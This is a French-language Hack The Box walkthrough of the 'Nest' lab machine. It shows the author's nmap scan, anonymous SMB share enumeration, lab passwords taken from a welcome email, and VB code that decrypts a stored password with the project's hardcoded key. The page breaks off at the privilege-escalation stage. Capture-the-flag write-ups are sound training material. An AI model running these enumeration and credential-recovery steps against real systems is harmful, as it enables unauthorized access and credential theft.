@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Nest • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Nest"/>
+<meta name="twitter:description" content="Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate"/>
+
+<meta property="og:title" content="Hack The Box - Nest" />
+<meta property="og:description" content="Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/nest/" />
+<meta property="article:published_time" content="2020-06-07T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2020-06-07T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haax9.github.io">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haax9.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+		<li>
+			<a href="https://cheatsheet.haax.fr" target="_blank">Cheasheet</a>
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/nest/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/nest/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2020 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Nest</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Jun 7, 2020
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 16 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Nest est une machine Windows considérée comme facile/moyenne. Un accès SMB anonyme permet de récupérer un premier compte non privilégié. La récupération d&rsquo;un mot de passe chiffré et des sources d&rsquo;un projet Visual Basic permet, après manipulation de récupérer le mot de passe de l&rsquo;utilisateur en clair. L&rsquo;escalade de privilège se fait au travers d&rsquo;un service de &ldquo;reporting&rdquo; permettant ainsi de récupérer une nouvelle chaine chiffrée sur le disque. Le déchiffrement de cette dernière permet un accès administrate</p>
+
+<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
+
+<h2 id="découverte-énumération">Découverte / Énumération</h2>
+
+<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
+
+<pre><code class="language-bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.178
+
+Nmap scan report for 10.10.10.178
+Host is up (0.030s latency).
+Not shown: 9999 filtered ports
+PORT     STATE SERVICE       VERSION
+445/tcp  open  microsoft-ds?
+4386/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
+|     Reporting Service V1.2
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     Reporting Service V1.2
+|     Unrecognised command
+|   Help: 
+|     Reporting Service V1.2
+|     This service allows users to run queries against databases using the legacy HQK format
+|     AVAILABLE COMMANDS ---
+|     LIST
+|     SETDIR &lt;Directory_Name&gt;
+|     RUNQUERY &lt;Query_ID&gt;
+|     DEBUG &lt;Password&gt;
+|_    HELP &lt;Command&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4386-TCP:V=7.70%I=7%D=2/23%Time=5E52D49C%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,21,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(GenericLin
+SF:es,3A,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
+SF:d\x20command\r\n&gt;&quot;)%r(GetRequest,3A,&quot;\r\nHQK\x20Reporting\x20Service\x2
+SF:0V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&quot;)%r(HTTPOptions,3A,&quot;\r\
+SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20comma
+SF:nd\r\n&gt;&quot;)%r(RTSPRequest,3A,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
+SF:n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&quot;)%r(RPCCheck,21,&quot;\r\nHQK\x20Repo
+SF:rting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(DNSVersionBindReqTCP,21,&quot;\r\nHQK
+SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(DNSStatusRequestTCP,21,&quot;
+SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(Help,F2,&quot;\r\nHQK\
+SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20allows\
+SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
+SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
+SF:\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_ID&gt;\r\
+SF:nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&quot;)%r(SSLSessionReq,21,&quot;\r
+SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(TLSSessionReq,21,&quot;\
+SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(Kerberos,21,&quot;\r\nH
+SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(SMBProgNeg,21,&quot;\r\nHQK
+SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(X11Probe,21,&quot;\r\nHQK\x20
+SF:Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(FourOhFourRequest,3A,&quot;\r\nHQ
+SF:K\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\
+SF:r\n&gt;&quot;)%r(LPDString,21,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
+SF:&gt;&quot;)%r(LDAPSearchReq,21,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\
+SF:n&gt;&quot;)%r(LDAPBindReq,21,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
+SF:&gt;&quot;)%r(SIPOptions,3A,&quot;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\
+SF:r\nUnrecognised\x20command\r\n&gt;&quot;)%r(LANDesk-RC,21,&quot;\r\nHQK\x20Reporting
+SF:\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(TerminalServer,21,&quot;\r\nHQK\x20Reporti
+SF:ng\x20Service\x20V1\.2\r\n\r\n&gt;&quot;)%r(NCP,21,&quot;\r\nHQK\x20Reporting\x20Ser
+SF:vice\x20V1\.2\r\n\r\n&gt;&quot;);
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista (91%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 1.473 days (since Sat Feb 22 09:20:24 2020)
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: Incremental
+
+Host script results:
+|_clock-skew: mean: 1m52s, deviation: 0s, median: 1m52s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-02-23 20:42:32
+|_  start_date: 2020-02-22 09:23:12
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:41
+Completed NSE at 20:41, 0.00s elapsed
+Initiating NSE at 20:41
+Completed NSE at 20:41, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1012.52 seconds
+           Raw packets sent: 30720 (1.357MB) | Rcvd: 663 (31.066KB)
+</code></pre>
+
+<p>Le scan révèle la présence d&rsquo;un port 445, classique, mais également le port 4386, qui semble être un service de &ldquo;Reporting&rdquo;.
+<br/></p>
+
+<h2 id="accès-smb-anonyme-et-récupération-d-un-compte-temporaire">Accès SMB anonyme et récupération d&rsquo;un compte temporaire</h2>
+
+<p>Pour les première recherches, on se tourne vers un service que l&rsquo;on connait déjà, les partages SMB. Grâce à une connexion anonyme, nous sommes en mesure de lister les partages visibles.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;&quot; -L \\\\10.10.10.178
+Unable to initialize messaging context
+Enter WORKGROUP\'s password: 
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    Data            Disk      
+    IPC$            IPC       Remote IPC
+    Secure$         Disk      
+    Users           Disk      
+SMB1 disabled -- no workgroup available
+</code></pre>
+
+<p>À priori, 3 partages peuvent être intéressants pour le moment :
+- Data
+- Secure$
+- USers$</p>
+
+<p>On commencer par regarder du côté du partage <code>Users$</code> ce qui permet entre autres de récupérer la liste des utilisateurs de la machine. Utile !</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;&quot; \\\\10.10.10.178\\Users
+Unable to initialize messaging context
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Jan 26 00:04:21 2020
+  ..                                  D        0  Sun Jan 26 00:04:21 2020
+  Administrator                       D        0  Fri Aug  9 17:08:23 2019
+  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
+  TempUser                            D        0  Thu Aug  8 00:55:56 2019
+
+        10485247 blocks of size 4096. 6545336 blocks available
+</code></pre>
+
+<p>Par curiosité, on tente également d&rsquo;aller faire un tour sur le partage <code>Secure$</code>. Comme son nom l&rsquo;indique, ce dernier est plus sécurisé et il n&rsquo;est pas possible de s&rsquo;y connecter sans compte utilisateur.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;&quot; \\\\10.10.10.178\\Secure$
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+NT_STATUS_ACCESS_DENIED listing \*
+</code></pre>
+
+<p>Dernière piste, le partage <code>Data</code> sur lequel on a accès à plusieurs éléments.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;&quot; \\\\10.10.10.178\\Data   
+Unable to initialize messaging context
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Aug  8 00:53:46 2019
+  ..                                  D        0  Thu Aug  8 00:53:46 2019
+  IT                                  D        0  Thu Aug  8 00:58:07 2019
+  Production                          D        0  Mon Aug  5 23:53:38 2019
+  Reports                             D        0  Mon Aug  5 23:53:44 2019
+  Shared                              D        0  Wed Aug  7 21:07:51 2019
+
+        10485247 blocks of size 4096. 6545336 blocks available
+</code></pre>
+
+<p>Après quelques recherches, on tombe rapidement sur un fichier texte &ldquo;Welcome Email&rdquo;. Ce type de fichier peut être très intéressant car peut contenir des informations telles que des comptes par défaut.</p>
+
+<pre><code class="language-bash">smb: \Shared\Templates\HR\&gt; ls
+  .                                   D        0  Wed Aug  7 21:08:01 2019
+  ..                                  D        0  Wed Aug  7 21:08:01 2019
+  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019
+
+        10485247 blocks of size 4096. 6545577 blocks available
+
+smb: \Shared\Templates\HR\&gt; get &quot;Welcome Email.txt&quot;
+getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (3.4 KiloBytes/sec) (average 1.9 KiloBytes/sec)
+</code></pre>
+
+<p>La récupération de ce fichier donne effectivement les informations souhaitées, puisqu&rsquo;un compte, accompagné de son mot de passe, est identifié !</p>
+
+<pre><code class="language-bash">$ cat Welcome\ Email.txt 
+We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\&lt;USERNAME&gt;
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+Thank you
+HR%        
+````
+
+On file de ce pas tenter une connexion avec notre nouveau compte du côté du partage `Secure$`, non accessible auparavant et bingo, celui ci devient à notre portée.
+
+```bash
+$ smbclient -U &quot;TempUser&quot; \\\\10.10.10.178\\Secure$
+Unable to initialize messaging context
+Enter WORKGROUP\TempUser\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Aug  8 01:08:12 2019
+  ..                                  D        0  Thu Aug  8 01:08:12 2019
+  Finance                             D        0  Wed Aug  7 21:40:13 2019
+  HR                                  D        0  Thu Aug  8 01:08:11 2019
+  IT                                  D        0  Thu Aug  8 12:59:25 2019
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="énumération-et-récupération-du-projet-vb">Énumération et récupération du projet VB</h2>
+
+<p>Ici commence une nouvelle phase d&rsquo;énumération. En effet, l&rsquo;ensemble des éléments non accessibles auparavant doivent être analysés, à la recherche de nouvelles informations.
+Cela comprend notamment une portion du partage <code>Data$</code> auparavant inaccessible.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;TempUser&quot; \\\\10.10.10.178\\Data    
+Enter WORKGROUP\TempUser\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd IT
+smb: \IT\&gt; ls
+  .                                   D        0  Thu Aug  8 00:58:07 2019
+  ..                                  D        0  Thu Aug  8 00:58:07 2019
+  Archive                             D        0  Tue Aug  6 00:33:58 2019
+  Configs                             D        0  Thu Aug  8 00:59:34 2019
+  Installs                            D        0  Thu Aug  8 00:08:30 2019
+  Reports                             D        0  Sun Jan 26 01:09:13 2020
+  Tools                               D        0  Tue Aug  6 00:33:43 2019
+
+        10485247 blocks of size 4096. 6545577 blocks available
+smb: \IT\&gt; cd
+</code></pre>
+
+<p>De la même façon que précédemment pour le fichier de bienvenue, on tombe rapidement en fouillant les répertoires de configuration sur un fichier intéressant, à priori utilisé pour un projet nommé &ldquo;RU Scanner&rdquo;.</p>
+
+<pre><code class="language-bash">smb: \IT\Configs\Ru Scanner\&gt; ls
+  .                                   D        0  Wed Aug  7 22:01:13 2019
+  ..                                  D        0  Wed Aug  7 22:01:13 2019
+  RU_config.xml                       A      270  Thu Aug  8 21:49:37 2019
+
+        10485247 blocks of size 4096. 6545577 blocks available
+</code></pre>
+
+<pre><code class="language-bash">$ cat RU_config.xml 
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;ConfigFile xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+  &lt;Port&gt;389&lt;/Port&gt;
+  &lt;Username&gt;c.smith&lt;/Username&gt;
+  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
+&lt;/ConfigFile&gt;%
+</code></pre>
+
+<p>Un utilisateur ! Le password semble ici chiffré. Néanmoins, pas de doute, on est sur la bonne piste.
+Nouvelle mission : trouver le projet &ldquo;RU Scanner&rdquo;. En effet, si ce dernier utilise des fichiers de configuration comme celui ci, alors il doit être en mesure de déchiffrer le mot de passe.</p>
+
+<p>Je ne l&rsquo;ai pas mentionné au début de l&rsquo;article, mais cette machine repose essentiellement sur de la reconnaissance et de la prise d&rsquo;information. Une fois n&rsquo;est pas coutûme, ne pouvant pas avancer, on continue de fouiller les ressources accessibles. Une bonne idée peut être d&rsquo;aller fouiller les autres ressources du répertoire &ldquo;Configs&rdquo;. En effet, on y trouve par exemple une configuration pour le logiciel Notepad++.</p>
+
+<pre><code class="language-bash">smb: \IT\Configs\NotepadPlusPlus\&gt; ls
+  .                                   D        0  Wed Aug  7 21:31:37 2019
+  ..                                  D        0  Wed Aug  7 21:31:37 2019
+  config.xml                          A     6451  Thu Aug  8 01:01:25 2019
+  shortcuts.xml                       A     2108  Wed Aug  7 21:30:27 2019
+
+        10485247 blocks of size 4096. 6545509 blocks available
+</code></pre>
+
+<p>Ce fichier nous révèle notamment un chemin absolu vers le répertoire de l&rsquo;utilisateur <code>Carl</code>.</p>
+
+<pre><code class="language-bash">    &lt;History nbMaxFile=&quot;15&quot; inSubMenu=&quot;no&quot; customLength=&quot;-1&quot;&gt;
+        &lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&gt;
+        &lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&gt;
+        &lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&gt;
+    &lt;/History&gt;
+</code></pre>
+
+<p>Même si nous n&rsquo;avons pas les droits pour lister le contenu du répertoire <code>IT</code>, il s&rsquo;avère qu&rsquo;il est possible de continuer dans l&rsquo;arborescence, si on dispose d&rsquo;un chemin valide. C&rsquo;est justement ce qu&rsquo;on vient de trouver. Ainsi, on peut se faufiler vers le répertoire de l&rsquo;utilisateur. :)</p>
+
+<pre><code class="language-bash">smb: \IT\Carl\&gt; ls
+  .                                   D        0  Wed Aug  7 21:42:14 2019
+  ..                                  D        0  Wed Aug  7 21:42:14 2019
+  Docs                                D        0  Wed Aug  7 21:44:00 2019
+  Reports                             D        0  Tue Aug  6 15:45:40 2019
+  VB Projects                         D        0  Tue Aug  6 16:41:55 2019
+
+        10485247 blocks of size 4096. 6545509 blocks available
+</code></pre>
+
+<p>Le répertoire <code>VB Projects</code> indique clairement la voie. Quelques répertoires plus loin, on tombe sur le fameux projet <code>RUScanner</code> !</p>
+
+<pre><code class="language-bash">smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; ls
+  .                                   D        0  Thu Aug  8 00:05:54 2019
+  ..                                  D        0  Thu Aug  8 00:05:54 2019
+  bin                                 D        0  Wed Aug  7 22:00:11 2019
+  ConfigFile.vb                       A      772  Thu Aug  8 00:05:09 2019
+  Module1.vb                          A      279  Thu Aug  8 00:05:44 2019
+  My Project                          D        0  Wed Aug  7 22:00:11 2019
+  obj                                 D        0  Wed Aug  7 22:00:11 2019
+  RU Scanner.vbproj                   A     4828  Fri Aug  9 17:37:51 2019
+  RU Scanner.vbproj.user              A      143  Tue Aug  6 14:55:27 2019
+  SsoIntegration.vb                   A      133  Thu Aug  8 00:05:58 2019
+  Utils.vb                            A     4888  Wed Aug  7 21:49:35 2019
+
+        10485247 blocks of size 4096. 6545509 blocks available
+</code></pre>
+
+<p>Petite astuce pour télécharger l&rsquo;ensemble d&rsquo;un répertoire avec smbclient.</p>
+
+<pre><code class="language-bash">smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; mask &quot;&quot;
+smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; recurse ON
+smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; prompt OFF
+smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; mget *
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\ConfigFile.vb of size 772 as ConfigFile.vb (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+...
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="déchiffrement-et-shell-utilisateur">Déchiffrement et shell utilisateur</h2>
+
+<p>Ayant maintenant le code source du projet VB, le but est d&rsquo;identifier les parties du codes permettant de réaliser le chiffrement/dechiffrement des mots de passe. Je ne vais pas rentrer dans les détails du code, mais une fonction <code>Decrypt</code> est identifiable assez facilement.</p>
+
+<p>Cette dernière prend plusieurs variables en paramètre, dont le mot de passe chiffré. Si vous ne disposez pas de l&rsquo;environnement nécessaire pour travailler avec du VB, sachez qu&rsquo;il existe plusieurs services en ligne offrant un environnement virtuel simplifié.</p>
+
+<p>C&rsquo;est notamment le cas de dotnetfiddle.com que j&rsquo;ai utilisé pour cette machine. On extrait ainsi la fonction de déchiffrement, que nous allons appeler dans un simple module, puis on affiche le résultat.</p>
+
+<pre><code class="language-bash">Imports System
+Imports System.Security.Cryptography
+Imports System.Text
+
+Public Module Module1
+    Public Sub Main()
+        Console.WriteLine(&quot;Hello World&quot;)
+        Dim password As String
+        password = Decrypt(&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;, &quot;N3st22&quot;, &quot;88552299&quot;, 2, &quot;464R5DFA5DL6LE28&quot;, 256)
+        Console.WriteLine(password)
+    End Sub
+    
+    Public Function Decrypt(ByVal cipherText As String, _
+                                   ByVal passPhrase As String, _
+                                   ByVal saltValue As String, _
+                                    ByVal passwordIterations As Integer, _
+                                   ByVal initVector As String, _
+                                   ByVal keySize As Integer) _
+                           As String
+
+        Dim initVectorBytes As Byte()
+        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
+
+        Dim saltValueBytes As Byte()
+        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
+
+        Dim cipherTextBytes As Byte()
+        cipherTextBytes = Convert.FromBase64String(cipherText)
+
+        Dim password As New Rfc2898DeriveBytes(passPhrase, _
+                                           saltValueBytes, _
+                                           passwordIterations)
+
+        Dim keyBytes As Byte()
+        keyBytes = password.GetBytes(CInt(keySize / 8))
+
+        Dim symmetricKey As New AesCryptoServiceProvider
+        symmetricKey.Mode = CipherMode.CBC
+
+        Dim decryptor As ICryptoTransform
+        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
+
+        Dim memoryStream As IO.MemoryStream
+        memoryStream = New IO.MemoryStream(cipherTextBytes)
+
+        Dim cryptoStream As CryptoStream
+        cryptoStream = New CryptoStream(memoryStream, _
+                                        decryptor, _
+                                        CryptoStreamMode.Read)
+
+        Dim plainTextBytes As Byte()
+        ReDim plainTextBytes(cipherTextBytes.Length)
+
+        Dim decryptedByteCount As Integer
+        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
+                                               0, _
+                                               plainTextBytes.Length)
+
+        memoryStream.Close()
+        cryptoStream.Close()
+
+        Dim plainText As String
+        plainText = Encoding.ASCII.GetString(plainTextBytes, _
+                                            0, _
+                                            decryptedByteCount)
+
+        Return plainText
+    End Function
+End Module
+</code></pre>
+
+<p>Le résultat ne se fait pas attendre, on obtient le mot de passe déchiffré !</p>
+
+<pre><code class="language-bash">Hello World
+xRxRxPANCAK3SxRxRx
+</code></pre>
+
+<p>Cela permet notamment de récupérer un accès à une nouvelle zone, ainsi que le flag utilisateur !</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;c.smith&quot; \\\\10.10.10.178\\Users
+Enter WORKGROUP\c.smith\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd C.Smith\
+smb: \C.Smith\&gt; ls
+  .                                   D        0  Sun Jan 26 08:21:44 2020
+  ..                                  D        0  Sun Jan 26 08:21:44 2020
+  HQK Reporting                       D        0  Fri Aug  9 01:06:17 2019
+  user.txt                            A       32  Fri Aug  9 01:05:24 2019
+
+        10485247 blocks of size 4096. 6545509 blocks available
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="récupération-du-mot-de-passe-de-debug">Récupération du mot de passe de DEBUG</h2>
+
+<p>Nouvel accès = nouvelle phase d&rsquo;énumération.
+Le répertoire <code>HQK Reporting</code> attire notre attention. Souvenez vous, des informations similaires étaient remontées lors du scan nmap. Il est donc logique qu&rsquo;il s&rsquo;agisse du service de reporting.</p>
+
+<pre><code class="language-bash">smb: \C.smith\HQK Reporting\&gt; ls
+  .                                   D        0  Fri Aug  9 01:06:17 2019
+  ..                                  D        0  Fri Aug  9 01:06:17 2019
+  AD Integration Module               D        0  Fri Aug  9 14:18:42 2019
+  Debug Mode Password.txt             A        0  Fri Aug  9 01:08:17 2019
+  HQK_Config_Backup.xml               A      249  Fri Aug  9 01:09:05 2019
+
+        10485247 blocks of size 4096. 6544215 blocks available
+</code></pre>
+
